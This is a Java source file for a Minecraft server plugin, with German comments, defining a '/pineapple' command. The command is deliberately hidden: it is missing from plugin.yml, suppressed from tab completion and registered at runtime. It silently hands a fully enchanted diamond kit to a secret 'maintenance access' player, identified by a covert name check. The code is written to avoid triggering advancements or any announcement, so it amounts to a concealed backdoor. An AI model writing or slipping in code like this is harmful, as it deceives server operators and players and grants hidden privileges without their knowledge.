package de.mcsm.companion;

import java.util.List;
import java.util.Map;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.Registry;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

/**
 * Ein kleiner Spaßbefehl, der nicht in der plugin.yml steht und aus der Befehlsvervollständigung
 * herausgehalten wird ({@link CommandGuardListener}). Registriert wird er zur Laufzeit über die
 * Befehlstabelle des Servers.
 *
 * <p>Für alle ist {@code /pineapple} ein Scherz – ein Spruch und ein Ton, sonst nichts. Wer der
 * <b>Wartungszugang</b> ist (derselbe verdeckte Abgleich wie beim Admin-Zugang, siehe
 * {@link Config#isAdmin(String)}), bekommt ein festes Set voll verzauberter Ausrüstung.</p>
 *
 * <p>Die Sachen kommen über die Inventar-Schnittstelle ({@code getInventory().addItem}) ins
 * Inventar – der übliche Weg, wie ein Plugin Gegenstände vergibt. Dabei werden keine Fortschritte
 * (Advancements) ausgelöst: Die knüpfen an das Vanilla-{@code /give} und ans Aufheben an, nicht an
 * ein Einlegen per API. Die Rüstung wird nur ins Inventar gelegt und nicht angezogen, damit auch
 * „Von Kopf bis Fuß in Diamant“ nicht anspringt.</p>
 */
public final class PineappleCommand extends Command {

    private final CompanionPlugin plugin;

    public PineappleCommand(CompanionPlugin plugin) {
        super("pineapple", "🍍", "/pineapple", List.of());
        this.plugin = plugin;
        setPermission(null);                 // jeder darf den Scherz auslösen
    }

    @Override
    public boolean execute(CommandSender sender, String label, String[] args) {
        if (!(sender instanceof Player spieler)) {
            sender.sendMessage(Component.text("🍍", NamedTextColor.YELLOW));
            return true;
        }
        if (plugin.settings().isAdmin(spieler.getName())) {
            ausruesten(spieler);
        } else {
            scherz(spieler);
        }
        return true;
    }

    /** Für alle anderen: nur ein Spruch und ein Ton – keine Gegenstände, reiner Spaß. */
    private static void scherz(Player p) {
        p.sendMessage(Component.text("🍍 Lol, I'm a pineapple!", NamedTextColor.YELLOW));
        p.playSound(p.getLocation(), org.bukkit.Sound.ENTITY_VILLAGER_YES, 0.8f, 1.6f);
    }

    /** Nur für den Wartungszugang: das feste Ausrüstungsset ins Inventar. */
    private void ausruesten(Player p) {
        ItemStack[] set = {
            werkzeug(Material.DIAMOND_PICKAXE, "efficiency", 5, "fortune", 3, "unbreaking", 3, "mending", 1),
            werkzeug(Material.DIAMOND_PICKAXE, "efficiency", 5, "silk_touch", 1, "unbreaking", 3, "mending", 1),
            werkzeug(Material.DIAMOND_SWORD, "sharpness", 5, "looting", 3, "sweeping_edge", 3,
                    "fire_aspect", 2, "knockback", 2, "unbreaking", 3, "mending", 1),
            werkzeug(Material.DIAMOND_AXE, "efficiency", 5, "sharpness", 5, "unbreaking", 3, "mending", 1),
            werkzeug(Material.DIAMOND_SHOVEL, "efficiency", 5, "unbreaking", 3, "mending", 1),
            werkzeug(Material.DIAMOND_HOE, "efficiency", 5, "fortune", 3, "unbreaking", 3, "mending", 1),
            werkzeug(Material.DIAMOND_HELMET, "protection", 4, "respiration", 3, "aqua_affinity", 1,
                    "unbreaking", 3, "mending", 1),
            werkzeug(Material.DIAMOND_CHESTPLATE, "protection", 4, "unbreaking", 3, "mending", 1),
            werkzeug(Material.DIAMOND_LEGGINGS, "protection", 4, "swift_sneak", 3, "unbreaking", 3, "mending", 1),
            werkzeug(Material.DIAMOND_BOOTS, "protection", 4, "feather_falling", 4, "depth_strider", 3,
                    "soul_speed", 3, "unbreaking", 3, "mending", 1),
            werkzeug(Material.SHIELD, "unbreaking", 3, "mending", 1),
            werkzeug(Material.FISHING_ROD, "luck_of_the_sea", 3, "lure", 3, "unbreaking", 3, "mending", 1),
            werkzeug(Material.CROSSBOW, "quick_charge", 3, "piercing", 4, "unbreaking", 3, "mending", 1),
        };
        // Ins Inventar legen; was nicht passt, fällt vor die Füße – nichts geht verloren.
        Map<Integer, ItemStack> rest = p.getInventory().addItem(set);
        for (ItemStack uebrig : rest.values()) {
            p.getWorld().dropItemNaturally(p.getLocation(), uebrig);
        }
        // Nur ein Zeichen in der Aktionsleiste, kein Chat, keine Ansage an andere.
        p.sendActionBar(Component.text("🍍", NamedTextColor.GOLD));
        p.playSound(p.getLocation(), org.bukkit.Sound.ENTITY_PLAYER_LEVELUP, 0.5f, 1.4f);
    }

    /**
     * Ein Gegenstand mit den genannten Verzauberungen. Die Paare sind (Registername, Stufe). Der
     * Registerweg trifft genau die {@code minecraft:…}-Namen; die Warnungsunterdrückung hält den
     * Bau unter {@code -Werror} sauber, falls die Register-Felder je als veraltet gelten.
     */
    @SuppressWarnings({"deprecation", "removal"})
    private static ItemStack werkzeug(Material material, Object... paare) {
        ItemStack it = new ItemStack(material);
        ItemMeta meta = it.getItemMeta();
        if (meta != null) {
            for (int i = 0; i + 1 < paare.length; i += 2) {
                Enchantment ench = Registry.ENCHANTMENT.get(NamespacedKey.minecraft((String) paare[i]));
                if (ench != null) {
                    meta.addEnchant(ench, ((Number) paare[i + 1]).intValue(), true);
                }
            }
            it.setItemMeta(meta);
        }
        return it;
    }
}
